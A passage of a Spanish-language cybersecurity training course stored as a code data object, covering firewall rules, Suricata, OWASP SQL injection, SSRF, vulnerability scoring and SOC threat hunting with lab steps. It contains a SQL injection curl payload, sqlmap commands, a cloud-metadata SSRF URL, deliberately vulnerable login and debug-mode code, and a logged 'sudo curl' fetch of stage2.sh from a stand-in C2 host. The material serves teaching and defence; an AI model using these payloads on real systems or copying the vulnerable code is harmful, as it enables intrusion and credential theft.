          'En un SOC moderno, **Suricata** se complementa con **Zeek**: mientras Suricata busca firmas de ataques conocidos y bloquea paquetes en modo **IPS Inline (`drop`)**, Zeek registra metadatos estructurados de absolutamente todas las conexiones (`conn.log`, `dns.log`, `http.log`, `ssl.log`) para permitir investigaciones retrospectivas de Threat Hunting.',
        ],
        keyTakeaways: [
          'Modo **IDS (Pasivo en puerto espejo SPAN/TAP)**: genera alertas sin interrumpir el tráfico.',
          'Modo **IPS (En línea / Inline)**: la acción `drop` descarta el paquete malicioso antes de que toque al servidor.',
        ],
        codeOrCommandExample:
          'ufw deny from 203.0.113.42 to any',
      },
      {
        id: 'mod-06-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Arquitectura de Segmentación: DMZ, Subredes de Datos y Microsegmentación Zero Trust',
        deepExplanation: [
          'En una red plana (*flat network*), si un atacante compromete un servidor web público, puede conectarse directamente por SMB (`445/TCP`), SSH (`22/TCP`) o PostgreSQL (`5432/TCP`) a todos los servidores de la empresa. La **Segmentación por Zonas de Confianza** divide la red en VLANs aisladas por un firewall interno:',
          '1. **Zona DMZ (Perímetro Expuesto):** aloja proxies inversos y balanceadores públicos sin datos sensibles.\n2. **Zona de Aplicaciones Internas:** solo acepta tráfico proveniente del balanceador de la DMZ.\n3. **Zona de Bases de Datos (Core):** jamás es alcanzable desde Internet ni desde la DMZ directamente; solo acepta conexiones en el puerto `5432/TCP` desde los servidores de aplicación autorizados.\n4. **Red de Administración (Out-of-Band / Bastión):** acceso administrativo restringido mediante MFA y Jump Host.',
        ],
        keyTakeaways: [
          'Una base de datos jamás debe residir en la DMZ ni tener ruta directa hacia Internet.',
          'La microsegmentación bloquea el tráfico **Este-Oeste (lateral)** entre servidores de una misma granja.',
        ],
        codeOrCommandExample:
          'ufw deny from 203.0.113.42 to any',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Intrusión Detectada',
        title: 'Detección de intentos de fuerza bruta y acceso desde 203.0.113.42 en auth.log',
        technicalDetail: 'El analista del SOC inspecciona `auth.log` con `grep "Failed password" auth.log` y confirma que la IP `203.0.113.42` está atacando activamente.',
      },
      {
        phase: 'Fase 2 · Contención en Kernel',
        title: 'Aplicación de regla de bloqueo en Netfilter / UFW',
        technicalDetail: 'Se ejecuta `ufw deny from 203.0.113.42 to any` para cortar toda comunicación entrante y saliente con el host adversario.',
      },
      {
        phase: 'Fase 3 · Prevención en Línea',
        title: 'Activación de regla drop en Suricata IPS',
        technicalDetail: 'Suricata en modo IPS en línea inspecciona el payload de aplicación y descarta cualquier paquete con firmas de explotación.',
      },
      {
        phase: 'Fase 4 · Egress Filtering',
        title: 'Cierre de puertos salientes no autorizados en la cadena OUTPUT',
        technicalDetail: 'Se configura política de salida restrictiva para impedir que cualquier proceso local abra conexiones hacia servidores C2 externos.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Orden de Reglas en Firewall Netfilter (Error de First Match Wins) y Regla Suricata',
      context: 'Configuración de firewall de un servidor de producción y regla de detección/prevención en Suricata.',
      vulnerableLabel: 'INSEGURO · Regla DENY colocada DESPUÉS de una regla ALLOW amplia',
      vulnerableSnippet:
        '# Orden de reglas en el firewall:\n[1] 22/tcp   ALLOW IN   Anywhere\n[2] 22/tcp   DENY IN    203.0.113.42\n# ERROR: Como la regla [1] permite a "Anywhere", la regla [2] NUNCA se evalúa.',
      vulnerableWhyItFails:
        'Netfilter evalúa de arriba hacia abajo (`First Match Wins`). Cuando llega un paquete desde `203.0.113.42` al puerto 22, coincide con la regla `[1]` (`ALLOW`) y entra al servidor.',
      secureLabel: 'SEGURO (HARDENED) · Bloqueo prioritario en posición 1 + Regla Suricata IPS drop',
      secureSnippet:
        '# 1. Bloqueo prioritario en el firewall antes de cualquier ALLOW:\nufw insert 1 deny from 203.0.113.42 to any\n\n# 2. Regla Suricata en modo IPS Inline (acción drop):\ndrop http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET EXPLOIT SQLi Tautology"; flow:established,to_server; http.uri; content:"OR 1=1"; nocase; sid:2026001; rev:1;)',
      secureWhyItWorks:
        'Al colocarse al principio de la tabla (`insert 1`), el paquete de `203.0.113.42` es descartado en el primer paso, y Suricata IPS (`drop`) frena ataques de Capa 7 en tiempo real.',
    },
    commandCheatSheet: [
      {
        command: 'grep "Failed password" auth.log',
        flagsBreakdown: 'Filtra intentos de acceso fallidos en el registro de autenticación.',
        whenToUse: 'Paso 1 del laboratorio para confirmar la dirección IP del atacante (`203.0.113.42`).',
      },
      {
        command: 'ufw deny from 203.0.113.42 to any',
        flagsBreakdown: '`deny` descarta paquetes; `from <IP>` especifica el origen malicioso; `to any` hacia cualquier puerto local.',
        whenToUse: 'Paso 2 del laboratorio para contener la intrusión en el firewall y capturar la bandera.',
      },
    ],
  },

  'mod-07': {
    moduleId: 'mod-07',
    competencyBadge: {
      code: 'CERT-07 · OWASP-WEB-APPSEC',
      name: 'Auditor de Seguridad Web OWASP Top 10 y Mitigación de Inyecciones',
      skillVerified: 'Auditoría de caja blanca/negra de SQL Injection (AST), remediación con Prepared Statements, prevención de IDOR/BOLA, XSS y SSRF.',
    },
    extendedSubModules: [
      {
        id: 'mod-07-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Por qué Ocurre SQL Injection a Nivel de Compilador (Árbol Sintáctico AST) y Tipos de SQLi',
        deepExplanation: [
          'Para entender de verdad la **Inyección SQL (CWE-89)** debes mirar cómo procesa una consulta un motor como PostgreSQL o MySQL: primero el **Lexer/Parser** convierte el texto SQL en un **Árbol de Sintaxis Abstracta (AST)** que define la lógica gramatical (`SELECT`, `WHERE`, `AND`, `OR`), y luego el ejecutor recorre ese árbol.',
          'Si concatenas la entrada del usuario antes de parsear (`"SELECT * FROM users WHERE username = \'" + user + "\'"`), el dato del usuario participa en la construcción del AST. Al enviar `\' OR 1=1 --`, el usuario inyecta un nuevo nodo lógico `OR 1=1` en el árbol. Existen tres variantes principales en auditorías reales: **In-Band (Union-based / Error-based)** donde los datos se ven en la misma respuesta HTTP; **Blind Boolean-based** donde la app no muestra datos pero responde distinto si una condición es verdadera o falsa; y **Blind Time-based (`pg_sleep(5)`)** donde el auditor mide si el servidor tarda 5 segundos en responder.',
        ],
        keyTakeaways: [
          'SQLi no es un problema de "caracteres prohibidos", sino de **mezclar código (gramática SQL) con datos en la misma cadena**.',
          'Con **Consultas Parametrizadas (`$1`, `?`)**, el motor compila el AST primero con un marcador de posición fijo, haciendo imposible alterar la estructura lógica.',
        ],
        codeOrCommandExample:
          '# Auditar el código fuente vulnerable y demostrar el bypass SQLi:\ncat auth_controller.js\ncurl "http://10.10.10.80/api/login?user=\' OR 1=1 --"',
      },
      {
        id: 'mod-07-ext-2',
        lessonNumber: 'Lección 4',
        title: 'OWASP A01: Broken Access Control, IDOR / BOLA y Escalada Horizontal vs. Vertical',
        deepExplanation: [
          'La vulnerabilidad número 1 del **OWASP Top 10** y del **OWASP API Security Top 10** no es una inyección, sino **Broken Access Control (IDOR — Insecure Direct Object Reference / BOLA — Broken Object Level Authorization)**.',
          'Diferencia entre **Autenticación** (*¿quién eres?*, validado mediante tu sesión o JWT) y **Autorización** (*¿tienes permiso sobre este objeto específico?*). Si un usuario autenticado con `user_id = 1050` solicita `GET /api/v1/facturas/1050` y luego cambia el número por `GET /api/v1/facturas/1001`, y el backend simplemente ejecuta `SELECT * FROM facturas WHERE id = $1` sin comprobar `AND owner_id = session.user_id`, cualquier cliente puede descargar las facturas de toda la base de datos.',
        ],
        keyTakeaways: [
          'Autenticación != Autorización. Validar el token JWT no basta; debes validar la **propiedad del recurso (`owner_id`)** en cada endpoint.',
          'Usa UUIDv4/ULID públicos además de validar siempre la pertenencia en el servidor.',
        ],
        codeOrCommandExample:
          'cat auth_controller.js',
      },
      {
        id: 'mod-07-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Cross-Site Scripting (XSS Reflejado, Almacenado y DOM) y Defensa en Profundidad',
        deepExplanation: [
          '**Cross-Site Scripting (XSS, CWE-79)** ocurre cuando una aplicación web incluye datos no confiables en el HTML o DOM sin codificación contextual, permitiendo que el navegador de otros usuarios ejecute código JavaScript arbitrario en el origen (`origin`) de la aplicación.',
          'Existen tres tipos: **Stored XSS** (el payload se guarda en la base de datos, como en un comentario o perfil, y se ejecuta en cada visitante), **Reflected XSS** (viaja en un parámetro de la URL) y **DOM-based XSS** (ocurre en el cliente al usar sumideros peligrosos como `element.innerHTML = ...` o `dangerouslySetInnerHTML`). La defensa exige: (1) Codificación contextual de salida, (2) Sanitización con `DOMPurify` si se requiere HTML rico, (3) Cabecera **`Content-Security-Policy (CSP)`** sin `unsafe-inline`, y (4) Cookies de sesión con **`HttpOnly; Secure; SameSite=Lax`**.',
        ],
        keyTakeaways: [
          '`HttpOnly` en `Set-Cookie` impide que un script XSS robe la cookie de sesión mediante `document.cookie`.',
          '`Content-Security-Policy` restringe desde qué orígenes el navegador acepta ejecutar scripts.',
        ],
        codeOrCommandExample:
          'curl "http://10.10.10.80/api/login?user=\' OR 1=1 --"',
      },
      {
        id: 'mod-07-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Server-Side Request Forgery (SSRF) y Deserialización Insegura',
        deepExplanation: [
          'En **SSRF (OWASP A10)**, una funcionalidad de la aplicación (como *"Importar avatar desde URL"* o *"Previsualizar Webhook"*) recibe una URL del usuario y el servidor backend realiza la petición HTTP por él. Si no se valida el destino, el atacante envía `http://127.0.0.1:6379/` (para hablar con servicios internos como Redis) o **`http://169.254.169.254/latest/meta-data/iam/security-credentials/`** (para robar las credenciales temporales IAM de la instancia Cloud).',
          'Mitigar SSRF requiere: validar la URL contra una **lista blanca estricta de dominios permitidos**, resolver el DNS y bloquear en el cliente HTTP cualquier dirección IP privada o link-local (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`), además de exigir **IMDSv2** en la infraestructura Cloud.',
        ],
        keyTakeaways: [
          'SSRF convierte al servidor web público en un proxy hacia la red interna y el servicio de metadatos Cloud (`169.254.169.254`).',
          'Nunca confíes en listas negras de texto (se evaden con redirecciones HTTP 302 o DNS Rebinding); valida la IP resuelta antes de conectar.',
        ],
        codeOrCommandExample:
          'sqlmap -u "http://10.10.10.80/api/login?user=test" --dbs',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Auditoría de Código',
        title: 'Inspección de auth_controller.js revelando concatenación directa de req.query.user',
        technicalDetail: 'El auditor ejecuta `cat auth_controller.js` y detecta `"SELECT id, username, role FROM users WHERE username = \'" + user + "\'"`.',
      },
      {
        phase: 'Fase 2 · Alteración del AST',
        title: 'Inyección del payload booleano \' OR 1=1 -- mediante curl',
        technicalDetail: 'La comilla simple cierra la cadena literal, `OR 1=1` hace que la cláusula `WHERE` sea verdadera para todas las filas y `--` ignora el resto.',
      },
      {
        phase: 'Fase 3 · Evasión de Login',
        title: 'Obtención del primer registro de la tabla (SUPERADMIN) y captura de Flag',
        technicalDetail: 'El servidor devuelve el JSON autenticado como `admin_ciso` junto con la bandera de verificación OWASP.',
      },
      {
        phase: 'Fase 4 · Parametrización',
        title: 'Refactorización a Prepared Statement ($1) y cabeceras HttpOnly + CSP',
        technicalDetail: 'Se separa la estructura SQL de los datos escalares usando marcadores `$1` y se blindan las cookies de sesión con `HttpOnly`.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Controlador de Login en Node.js + PostgreSQL (CWE-89 SQL Injection)',
      context: 'Endpoint `/api/login` del portal financiero auditado en `auth_controller.js`.',
      vulnerableLabel: 'VULNERABLE · Concatenación de cadenas en consulta SQL',
      vulnerableSnippet:
        'app.get("/api/login", async (req, res) => {\n  const { user } = req.query;\n  // VULNERABLE: el parámetro user modifica el árbol sintáctico (AST) de SQL\n  const query = "SELECT id, username, role FROM users WHERE username = \'" + user + "\'";\n  const result = await db.query(query);\n  return res.json(result.rows);\n});',
      vulnerableWhyItFails:
        'Al concatenar `user` dentro de la cadena SQL, cualquier comilla simple `\'` rompe el contexto de datos y pasa a ejecutarse como comandos SQL.',
      secureLabel: 'SEGURO (HARDENED) · Consulta Parametrizada (Prepared Statement) + Cookie HttpOnly',
      secureSnippet:
        'app.get("/api/login", async (req, res) => {\n  const user = String(req.query.user || "");\n  // SEGURO: PostgreSQL compila el AST primero y pasa [user] como literal puro\n  const query = "SELECT id, username, role FROM users WHERE username = $1";\n  const result = await db.query(query, [user]);\n  res.cookie("sid", token, { httpOnly: true, secure: true, sameSite: "lax" });\n  return res.json(result.rows);\n});',
      secureWhyItWorks:
        'El marcador `$1` garantiza en el protocolo binario de PostgreSQL que el valor de `user` jamás sea interpretado como sintaxis SQL, incluso si contiene `\' OR 1=1 --`.',
    },
    commandCheatSheet: [
      {
        command: 'cat auth_controller.js',
        flagsBreakdown: 'Muestra el código fuente del controlador de Node.js en el directorio de auditoría.',
        whenToUse: 'Paso 1 del laboratorio (auditoría de caja blanca) para localizar la línea exacta de concatenación SQL.',
      },
      {
        command: "curl \"http://10.10.10.80/api/login?user=' OR 1=1 --\"",
        flagsBreakdown: 'Envía una petición HTTP GET inyectando la tautología SQL en el parámetro `user`.',
        whenToUse: 'Paso 2 del laboratorio para demostrar la evasión de autenticación y capturar la bandera.',
      },
      {
        command: 'sqlmap -u "http://10.10.10.80/api/login?user=test" --dbs',
        flagsBreakdown: '`-u` especifica la URL con el parámetro a probar; `--dbs` enumera las bases de datos.',
        whenToUse: 'Para automatizar la confirmación y enumeración de esquemas en endpoints vulnerables.',
      },
    ],
  },

  'mod-08': {
    moduleId: 'mod-08',
    competencyBadge: {
      code: 'CERT-08 · VULN-MGMT-DEVSECOPS',
      name: 'Especialista en Gestión de Vulnerabilidades (CVE/CVSS/EPSS) y DevSecOps',
      skillVerified: 'Priorización basada en riesgo real (CVSS + EPSS + CISA KEV), validación sin falsos positivos y pipelines SAST/SCA/DAST.',
    },
    extendedSubModules: [
      {
        id: 'mod-08-ext-1',
        lessonNumber: 'Lección 3',
        title: 'Desglose Completo de una Cadena Vectorial CVSS v3.1 / v4.0',
        deepExplanation: [
          'En lugar de mirar únicamente un número del 0 al 10, un ingeniero de seguridad lee la cadena vectorial de **CVSS (Common Vulnerability Scoring System)** para entender las condiciones exactas de explotación. Veamos cada métrica de `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`:',
          '- **`AV` (Attack Vector):** `N` (Network, explotable remotamente por Internet), `A` (Adjacent LAN), `L` (Local), `P` (Physical).\n- **`AC` (Attack Complexity):** `L` (Low, repetible sin condiciones especiales) o `H` (High).\n- **`PR` (Privileges Required):** `N` (None, sin autenticación previa), `L` (Low user), `H` (Admin).\n- **`UI` (User Interaction):** `N` (None, "Zero-Click") o `R` (Required, ej. hacer clic en un enlace).\n- **`S` (Scope):** `U` (Unchanged) o **`C` (Changed: la vulnerabilidad está en un componente pero permite comprometer otro ámbito, como escapar de una VM o contenedor al host físico)**.\n- **`C / I / A`:** Impacto en Confidencialidad, Integridad y Disponibilidad (`None`, `Low`, `High`).',
        ],
        keyTakeaways: [
          'La combinación más peligrosa en un activo perimetral es **`AV:N/AC:L/PR:N/UI:N`** (explotable por red sin credenciales ni clic del usuario).',
          '`S:C` (Scope: Changed) indica que el fallo permite cruzar una frontera de aislamiento de seguridad.',
        ],
        codeOrCommandExample:
          '# Identificar versiones exactas de servicios expuestos con Nmap:\nnmap -sV 10.10.10.45',
      },
      {
        id: 'mod-08-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Por qué CVSS No Basta: Priorización Basada en Riesgo con EPSS y CISA KEV',
        deepExplanation: [
          'Más de 30.000 nuevos CVEs se publican cada año y miles tienen puntaje CVSS $\\ge 7.0$, pero los estudios empíricos demuestran que **menos del 5% de los CVEs publicados llegan a ser explotados en ataques reales**. Si un equipo de infraestructura intenta parchear únicamente por orden de puntaje CVSS, se satura parcheando vulnerabilidades teóricas sin exploit público mientras deja expuesta una vulnerabilidad con CVSS 7.5 que los grupos de ransomware están explotando hoy.',
          'La ingeniería moderna combina tres señales en una matriz de decisión:\n1. **Catálogo CISA KEV (Known Exploited Vulnerabilities):** lista oficial de CVEs con explotación activa confirmada en el mundo real (prioridad absoluta, parcheo en < 24–48h).\n2. **EPSS (Exploit Prediction Scoring System):** modelo estadístico diario que asigna una probabilidad del `0% al 100%` de que un CVE sea explotado en los próximos 30 días.\n3. **Contexto del Activo:** ¿está expuesto a Internet (`AV:N`) o aislado sin acceso externo?',
        ],
        keyTakeaways: [
          '**CVSS** = Severidad técnica teórica (0.0 – 10.0).',
          '**EPSS** = Probabilidad empírica de explotación en los próximos 30 días (0% – 100%).',
          '**CISA KEV** = Explotación activa ya confirmada en incidentes reales.',
        ],
        codeOrCommandExample:
          '# Validar activamente el servicio detectado en el puerto 8080:\ncurl http://10.10.10.45:8080',
      },
      {
        id: 'mod-08-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Pipeline DevSecOps: Diferencias Exactas entre SAST, SCA (SBOM) y DAST',
        deepExplanation: [
          'Para detectar vulnerabilidades antes de llegar a producción, integramos tres familias de escáneres automatizados en el pipeline CI/CD (GitHub Actions / GitLab CI):',
          '1. **SAST (Static Application Security Testing — ej. Semgrep, CodeQL, SonarQube):** analiza el **código fuente propio** que escriben tus desarrolladores sin ejecutarlo, buscando patrones inseguros como concatenaciones SQL o `shell=True`.\n2. **SCA (Software Composition Analysis — ej. Trivy, Dependabot, Snyk) + SBOM:** inspecciona los manifiestos de dependencias de terceros (`package-lock.json`, `requirements.txt`, `go.mod`, imágenes Docker) y los cruza contra bases de datos de CVEs conocidos.\n3. **DAST (Dynamic Application Security Testing — ej. OWASP ZAP, Nuclei):** envía peticiones reales contra la aplicación ya levantada en un entorno de staging para descubrir fallos de configuración, cabeceras ausentes o endpoints expuestos.',
        ],
        keyTakeaways: [
          'SAST = tu propio código fuente; SCA = librerías de terceros (`node_modules`); DAST = aplicación corriendo en vivo.',
          'Un **SBOM (Software Bill of Materials, formato CycloneDX/SPDX)** permite saber en 10 segundos qué servidores usan una librería afectada cuando sale un Zero-Day como Log4Shell.',
        ],
        codeOrCommandExample:
          'nmap -sV 10.10.10.45\ncurl http://10.10.10.45:8080',
      },
      {
        id: 'mod-08-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Descarte de Falsos Positivos (Backporting en Linux) y Parcheo Virtual (WAF)',
        deepExplanation: [
          'Cuando un escáner de red ejecuta `nmap -sV` y ve el banner `OpenSSH 8.9p1 Ubuntu 3ubuntu0.10`, a menudo reporta falsos positivos porque solo compara el número `8.9p1`. Distribuciones empresariales como Ubuntu, Debian y RHEL practican **Security Backporting**: mantienen la versión base `8.9p1` para no romper compatibilidad, pero extraen el parche de seguridad de la versión nueva y lo aplican en el sufijo `-3ubuntu0.10`.',
          'Por ello, todo analista debe verificar si la vulnerabilidad es real (validación sin falsos positivos) y, cuando un sistema crítico legado no puede reiniciarse hoy mismo, aplicar un **Control Compensatorio / Parche Virtual** (como restringir el puerto en el firewall a una VPN administrativa o desplegar una regla específica en el WAF/IPS) mientras se programa la ventana de mantenimiento.',
        ],
        keyTakeaways: [
          'Los escáneres basados solo en banners generan falsos positivos por el *backporting* de parches en Linux.',
          'Valida siempre el hallazgo de forma controlada antes de escalar una alerta crítica.',
        ],
        codeOrCommandExample:
          'curl http://10.10.10.45:8080',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Descubrimiento',
        title: 'Enumeración de versiones de servicios con nmap -sV 10.10.10.45',
        technicalDetail: 'El escaneo revela un servicio `Werkzeug/3.0.1 Python/3.11.6` con modo Debug expuesto en el puerto `8080/tcp`.',
      },
      {
        phase: 'Fase 2 · Validación Activa',
        title: 'Confirmación sin falsos positivos mediante petición HTTP al puerto 8080',
        technicalDetail: 'El auditor ejecuta `curl http://10.10.10.45:8080` y confirma que la consola interactiva de depuración responde en vivo, capturando la bandera.',
      },
      {
        phase: 'Fase 3 · Matriz de Riesgo',
        title: 'Cruce de severidad CVSS (AV:N/PR:N) con probabilidad EPSS y exposición',
        technicalDetail: 'Al permitir ejecución remota sin credenciales por red, se clasifica como Prioridad P0 (remediación inmediata).',
      },
      {
        phase: 'Fase 4 · Remediación + CI/CD',
        title: 'Desactivación de Debug en producción y bloqueo en CI con SCA/SAST',
        technicalDetail: 'Se deshabilita `debug=True`, se cierra el puerto 8080 en el firewall perimetral y se añade validación en el pipeline CI.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Despliegue de Servicio Web Python en Producción y Escaneo en CI/CD',
      context: 'Servicio micro-API expuesto accidentalmente con el depurador interactivo de Werkzeug habilitado.',
      vulnerableLabel: 'VULNERABLE · Servidor de desarrollo con debug=True expuesto en 0.0.0.0',
      vulnerableSnippet:
        '# app.py desplegado directamente en producción:\nif __name__ == "__main__":\n    # PELIGRO CRÍTICO: debug=True activa el evaluador interactivo de código en /console\n    app.run(host="0.0.0.0", port=8080, debug=True)',
      vulnerableWhyItFails:
        'El modo `debug=True` de Werkzeug expone una consola interactiva de Python que permite Ejecución Remota de Código (RCE) a quien acceda al puerto 8080.',
      secureLabel: 'SEGURO (HARDENED) · Servidor WSGI de producción (Gunicorn) tras Proxy Inverso',
      secureSnippet:
        '# Despliegue seguro con Gunicorn escuchando solo en loopback local:\n# gunicorn --bind 127.0.0.1:8080 --workers 4 app:app\nif __name__ == "__main__":\n    app.run(host="127.0.0.1", port=8080, debug=False)',
      secureWhyItWorks:
        'Desactiva por completo el depurador interactivo (`debug=False`) y liga el servicio a `127.0.0.1` para que solo sea accesible a través del proxy inverso TLS.',
    },
    commandCheatSheet: [
      {
        command: 'nmap -sV 10.10.10.45',
        flagsBreakdown: '`-sV` interroga los puertos abiertos para obtener el banner exacto de versión.',
        whenToUse: 'Paso 1 del laboratorio para descubrir los servicios y versiones corriendo en `10.10.10.45`.',
      },
      {
        command: 'curl http://10.10.10.45:8080',
        flagsBreakdown: 'Realiza una petición HTTP GET al puerto 8080 detectado en el escaneo.',
        whenToUse: 'Paso 2 del laboratorio para validar activamente la exposición del servicio y obtener la bandera.',
      },
    ],
  },

  'mod-09': {
    moduleId: 'mod-09',
    competencyBadge: {
      code: 'CERT-09 · SOC-THREAT-HUNTER',
      name: 'Analista Senior Blue Team, Ingeniería de Detección Sigma y Threat Hunting',
      skillVerified: 'Correlación de eventos en SIEM, telemetría Sysmon/auditd, mapeo MITRE ATT&CK y caza de amenazas Living off the Land.',
    },
    extendedSubModules: [
      {
        id: 'mod-09-ext-1',
        lessonNumber: 'Lección 3',
        title: 'La Pirámide del Dolor de David Bianco y Por Qué Cazamos Comportamientos (TTPs)',
        deepExplanation: [
          'Muchos equipos de seguridad novatos basan su defensa únicamente en bloquear listas de hashes MD5/SHA-256 o direcciones IP maliciosas. **David Bianco** formuló la **Pirámide del Dolor** para mostrar cuánto le cuesta a un atacante evadir cada tipo de indicador:',
          '- **Nivel 1 (Base — Trivial): Valores Hash (SHA-256).** El atacante añade un espacio al final de su script y el hash cambia por completo en 1 segundo.\n- **Nivel 2 (Fácil): Direcciones IP.** El atacante cambia de servidor VPS o proxy en minutos.\n- **Nivel 3 (Simple): Nombres de Dominio.** Registrar un dominio nuevo toma pocos minutos.\n- **Nivel 4 (Molesto): Artefactos de Red/Host** (User-Agents específicos, nombres de claves de registro o rutas como `/tmp/.systemd-sync`).\n- **Nivel 5 (Difícil): Herramientas** (firmas YARA sobre Impacket, Mimikatz o Cobalt Strike).\n- **Nivel 6 (Cúspide — Muy Doloroso): TTPs (Tácticas, Técnicas y Procedimientos de MITRE ATT&CK).** Si detectas el *comportamiento* (por ejemplo, *"el servidor web `nginx` o `node` engendra un proceso hijo `/bin/sh` o `curl`"*), obligas al adversario a rediseñar toda su operación.',
        ],
        keyTakeaways: [
          'Los hashes e IPs son útiles para contención inmediata, pero caducan rápido.',
          'Las **Reglas Sigma** apuntan a la cúspide de la pirámide: detectan relaciones padre-hijo de procesos y líneas de comandos (**TTPs**).',
        ],
        codeOrCommandExample:
          '# Reconstruir toda la cadena de ataque (Kill Chain) en auth.log:\ncat auth.log',
      },
      {
        id: 'mod-09-ext-2',
        lessonNumber: 'Lección 4',
        title: 'Guía Definitiva de Event IDs Críticos en Windows Security y Sysmon',
        deepExplanation: [
          'En un entorno corporativo Windows + SIEM, existen 7 identificadores de evento que todo analista SOC debe conocer de memoria:',
          '- **Windows Event ID `4624`:** Inicio de sesión exitoso (revisar `LogonType`: `2` = Interactivo local, `3` = Red/SMB, `10` = Escritorio Remoto RDP).\n- **Windows Event ID `4625`:** Inicio de sesión fallido (múltiples `4625` seguidos de un `4624` desde la misma IP indican éxito tras ataque de fuerza bruta).\n- **Windows Event ID `4688` / Sysmon Event ID `1`:** Creación de proceso (incluye `CommandLine` completo y `ParentImage`).\n- **Sysmon Event ID `3`:** Conexión de red iniciada por un proceso (asocia exactamente qué PID y binario abrió un socket hacia una IP externa).\n- **Sysmon Event ID `10` (`ProcessAccess`):** Un proceso abre la memoria de otro proceso (cuando `TargetImage` es `C:\\Windows\\System32\\lsass.exe`, alerta de robo de credenciales **MITRE `T1003.001`**).\n- **Sysmon Event ID `11`:** Creación de archivo en disco.\n- **Sysmon Event ID `22`:** Consulta DNS realizada por un proceso.',
        ],
        keyTakeaways: [
          '`Sysmon ID 1` = Creación de proceso; `Sysmon ID 3` = Red; `Sysmon ID 10` = Lectura de memoria de otro proceso (`lsass.exe`).',
          'En Linux, el demonio **`auditd`** (`SYSCALL=execve`) cumple el mismo rol que Sysmon Event ID 1.',
        ],
        codeOrCommandExample:
          'cat auth.log',
      },
      {
        id: 'mod-09-ext-3',
        lessonNumber: 'Lección 5',
        title: 'Cómo Escribir y Leer una Regla Sigma Universal para SIEM',
        deepExplanation: [
          '**Sigma** es para los registros de logs lo que **Snort/Suricata** es para los paquetes de red y **YARA** es para los archivos binarios: un formato YAML abierto que puede compilarse automáticamente a consultas de Elastic (KQL), Splunk (SPL) o Microsoft Sentinel (KQL).',
          'Toda regla Sigma define tres bloques esenciales: **`logsource`** (por ejemplo `product: linux, service: auth` o `category: process_creation`), **`detection`** (donde defines diccionarios `selection` con modificadores como `CommandLine|contains` o `ParentImage|endswith`, y una expresión booleana `condition: selection and not filter`) y **`level`** (`low`, `medium`, `high`, `critical`) junto con sus etiquetas `tags: [attack.privilege_escalation, attack.t1548]`.',
        ],
        keyTakeaways: [
          'Sigma desacopla la lógica de detección del proveedor de SIEM específico.',
          'Toda buena regla Sigma incluye una cláusula `and not filter` para excluir actividad legítima de administradores y reducir la **Fatiga de Alertas**.',
        ],
        codeOrCommandExample:
          'cat auth.log\nufw deny from 203.0.113.42 to any',
      },
      {
        id: 'mod-09-ext-4',
        lessonNumber: 'Lección 6',
        title: 'Ciclo de Respuesta a Incidentes NIST SP 800-61 Rev. 2 en el SOC',
        deepExplanation: [
          'Cuando una alerta de alta fidelidad se dispara en el SIEM, el equipo Blue Team ejecuta las 4 fases del estándar **NIST SP 800-61 Rev. 2**:',
          '1. **Preparación:** tener desplegados Sysmon/auditd, sincronización horaria NTP en UTC en todos los servidores y playbooks listos.\n2. **Detección y Análisis:** correlacionar los eventos para determinar el **Paciente Cero**, la cuenta comprometida (`deploy`), la IP origen (`203.0.113.42`) y los comandos ejecutados (`sudo curl`).\n3. **Contención, Erradicación y Recuperación:** aislar el host o bloquear la IP del C2 en el firewall, preservar la evidencia forense antes de borrar nada, revocar las credenciales comprometidas y eliminar la persistencia.\n4. **Actividad Post-Incidente (*Lessons Learned*):** escribir una nueva regla Sigma para detectar esa técnica en segundos si vuelve a ocurrir.',
        ],
        keyTakeaways: [
          'Todos los servidores deben registrar sus logs en **zona horaria UTC** para poder correlacionar líneas temporales entre distintos equipos.',
          'Nunca borres un archivo malicioso sin antes contener la red y preservar su hash/copia forense.',
        ],
        codeOrCommandExample:
          'cat auth.log',
      },
    ],
    attackDefenseAnatomy: [
      {
        phase: 'Fase 1 · Fuerza Bruta SSH',
        title: 'Múltiples eventos Failed password desde 203.0.113.42 contra admin y root',
        technicalDetail: 'El registro `auth.log` evidencia un barrido automatizado de contraseñas desde la IP `203.0.113.42`.',
      },
      {
        phase: 'Fase 2 · Compromiso Inicial',
        title: 'Evento Accepted publickey para la cuenta operativa deploy',
        technicalDetail: 'Segundos después de los fallos, el atacante logra autenticarse con una clave SSH filtrada de la cuenta `deploy`.',
      },
      {
        phase: 'Fase 3 · Ejecución LotL',
        title: 'Abuso de sudo curl (LOLBin) para descargar stage2.sh desde el C2',
        technicalDetail: 'Al leer `cat auth.log`, se descubre que `deploy` ejecutó `sudo /usr/bin/curl -s http://203.0.113.42:4443/stage2.sh` como `root`, revelando la bandera del SIEM.',
      },
      {
        phase: 'Fase 4 · Contención + Sigma',
        title: 'Bloqueo de 203.0.113.42 en firewall, rotación de clave SSH y regla Sigma',
        technicalDetail: 'Se bloquea la IP del C2 con `ufw deny from 203.0.113.42 to any`, se revoca `authorized_keys` de `deploy` y se despliega la regla Sigma para `sudo curl`.',
      },
    ],
    vulnerableVsSecureCode: {
      title: 'Ingeniería de Detección: Regla Frágil por IP/Nombre vs. Regla Comportamental Sigma',
      context: 'Detección de descarga de payloads con binarios del sistema (Living off the Land — MITRE T1105).',
      vulnerableLabel: 'FRÁGIL · Alerta basada únicamente en una IP fija o nombre de archivo',
      vulnerableSnippet:
        '# Regla frágil que el atacante evade en 5 segundos cambiando el nombre del script:\nselection:\n  CommandLine|contains: "http://203.0.113.42:4443/stage2.sh"',
      vulnerableWhyItFails:
        'Si el adversario cambia de servidor VPS o renombra `stage2.sh` a `update.sh`, la regla deja de detectar el ataque (Base de la Pirámide del Dolor).',
